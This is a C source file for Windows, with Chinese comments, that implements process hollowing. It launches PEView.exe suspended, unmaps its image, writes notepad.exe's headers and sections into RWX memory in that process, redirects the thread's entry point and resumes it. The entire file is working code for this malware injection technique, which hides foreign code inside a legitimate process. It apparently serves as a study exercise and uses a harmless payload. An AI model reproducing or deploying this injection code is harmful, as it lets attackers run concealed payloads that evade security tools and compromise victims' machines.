#include<windows.h>
#include<stdio.h>

char path[MAX_PATH]="c:\\Users\\Admin\\Desktop\\PEView.exe";//被注入的傀儡进程
char path2[MAX_PATH]="c:\\Users\\Admin\\Desktop\\notepad.exe";//注入的进程
int CreateProc(char *,PROCESS_INFORMATION * );//创建傀儡进程
int UnmapView(PROCESS_INFORMATION);//卸载傀儡进程内存映射 
int Injection(PROCESS_INFORMATION);//实现注入
DWORD GetImageSize(char *);//获取SizeOfImage
DWORD GetEntryPoint();//获取OEP
DWORD GetImageBase();//获取基址

CONTEXT context;//定义线程上下文结构
HANDLE hfile;//要注入的文件的句柄
char * pBuffer;//将文件读入内存的指针


DWORD align(int input, int alignment) {
    int mod = input % alignment;
    double div = (double) input / (double) alignment;
    if (mod == 0) {
        return alignment * div;
    } else {
        return alignment * (int) (div + 1);
    }

}




void main()
{
	PROCESS_INFORMATION  pi;
	if(!CreateProc(path,&pi))//创建傀儡进程
		return;
	if(UnmapView(pi)!=0)//卸载映射
		return;
	if(Injection(pi)==0)//实现注入
		return;
	printf("INJECTION SUCCESS");
	system("pause");

}
int CreateProc(char * path,PROCESS_INFORMATION * pi)
{
	STARTUPINFOA si;
	ZeroMemory(&si,sizeof(si));//初始化为0
	si.cb=sizeof(si);
	ZeroMemory(pi,sizeof(pi));
	return CreateProcessA(path,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,pi);//以挂起的方式创建进程
}
int UnmapView(PROCESS_INFORMATION pi)
{
	typedef NTSTATUS (WINAPI *ZwUnmapViewOfSection)(HANDLE,LPVOID);//定义函数
	ZwUnmapViewOfSection UnmapViewOfSection = (ZwUnmapViewOfSection)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")),"ZwUnmapViewOfSection");//获取函数基址
	context.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread,&context);//获取线程上下文
	DWORD base;
	ReadProcessMemory(pi.hProcess,(LPVOID)(context.Ebx+8),&base,sizeof(DWORD),NULL);//读取傀儡进程基址
	return UnmapViewOfSection(pi.hProcess,(LPVOID)base);//卸载傀儡进程映射
}
int Injection(PROCESS_INFORMATION pi)
{
	DWORD ImageSize = GetImageSize(path2);//获取要注入进程的ImageSize
	DWORD ImageBase = GetImageBase();//获取IMageBase
	context.Eax = (GetEntryPoint()+ImageBase);//获取要注入的进程的入口点,eax中保存着入口点
	VirtualAllocEx(pi.hProcess,(LPVOID)ImageBase,ImageSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);//在傀儡进程中申请要注入的进程所需要的空间大小，注意以注入的内容的ImageBase为基址，这样就不用修复重定位和IAT
	if(!WriteProcessMemory(pi.hProcess,(LPVOID)ImageBase,pBuffer,PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->OptionalHeader.SizeOfHeaders,NULL))//将要注入的HEADER映射到傀儡进程
		return 0;
	PIMAGE_SECTION_HEADER psection =IMAGE_FIRST_SECTION(PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer));
	for(int i=0;i<PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->FileHeader.NumberOfSections;i++)
	{
		if(!WriteProcessMemory(pi.hProcess,(LPVOID)(ImageBase+psection->VirtualAddress),pBuffer+psection->PointerToRawData,psection->SizeOfRawData,NULL))//将要注入的区块映射到傀儡进程
			return 0;
		++psection;
	}
	if(!WriteProcessMemory(pi.hProcess,(BYTE *)context.Ebx+8,&ImageBase,sizeof(DWORD),NULL))//将要注入的修改线程上下文中的ImageBase
			return 0;
	SetThreadContext(pi.hThread,&context);//设置修改后的线程上下文



	////保存文件
 //   PIMAGE_DOS_HEADER pDosHeader = NULL;
 //   PIMAGE_NT_HEADERS pNTHeader = NULL;
 //   PIMAGE_FILE_HEADER pPEHeader = NULL;
 //   PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL;
 //   PIMAGE_SECTION_HEADER pSectionHeader = NULL;
 //   pDosHeader = (PIMAGE_DOS_HEADER) pBuffer;
 //   pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pBuffer + pDosHeader->e_lfanew);
 //   pPEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + 4);
 //   pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pPEHeader + IMAGE_SIZEOF_FILE_HEADER);
 //   pSectionHeader = (PIMAGE_SECTION_HEADER) ((DWORD) pOptionHeader + pPEHeader->SizeOfOptionalHeader);
	//FILE *pf = fopen("goodBuffer", "wb+");


	//LPVOID pGoodBuffer = NULL;
	//pGoodBuffer = calloc(1, align(ImageSize,pOptionHeader->SectionAlignment));
	//memcpy(pGoodBuffer, pBuffer, PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->OptionalHeader.SizeOfHeaders);
	//PIMAGE_SECTION_HEADER psection2 =IMAGE_FIRST_SECTION(PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer));
	//for(int i=0;i<PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->FileHeader.NumberOfSections;i++)
	//{
	//	memcpy((LPVOID)((DWORD)pGoodBuffer + (psection2->VirtualAddress)), pBuffer+psection2->PointerToRawData,psection2->SizeOfRawData);
	//	++psection2;
	//}

	//if (pf == NULL) {
	//	printf("Unable to open file!");
	//}
	//fwrite(pGoodBuffer, ImageSize, 1, pf);
	//fclose(pf);











	ResumeThread(pi.hThread);//恢复线程
	return 1;
}
DWORD GetImageSize(char *path)//读入文件到内存
{
	hfile = CreateFileA(path2,GENERIC_READ|GENERIC_WRITE,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);//打开要注入的文件
	if(hfile == INVALID_HANDLE_VALUE)
		exit(0);
	DWORD filesize = GetFileSize(hfile,NULL);
	pBuffer = new char[filesize];
	ReadFile(hfile,pBuffer,filesize,&filesize,NULL);
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	if(pDosHeader->e_magic!=0x5A4D)
		exit(0);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew+pBuffer);
	return pNtHeaders->OptionalHeader.SizeOfImage;//遍历PE结构拿到SizeOfImage
}
DWORD GetEntryPoint()
{
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	if(pDosHeader->e_magic!=0x5A4D)
		exit(0);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew+pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	return OptionalHeader->AddressOfEntryPoint;//遍历PE结构拿到AddressOfEntryPoint
}
DWORD GetImageBase()
{
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew+pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	return OptionalHeader->ImageBase;//从PE结构找到ImageBase

}